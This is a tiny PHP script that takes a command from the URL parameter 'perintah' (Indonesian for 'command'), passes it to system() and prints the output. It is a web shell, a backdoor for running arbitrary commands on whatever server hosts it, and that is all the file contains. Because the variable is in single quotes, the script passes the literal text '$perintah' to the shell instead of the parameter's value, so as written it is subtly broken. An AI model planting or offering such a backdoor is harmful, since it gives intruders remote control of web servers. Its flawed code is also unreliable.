<?php
$perintah = $_GET['perintah'];
$komando = system('$perintah');
echo $komando;
?>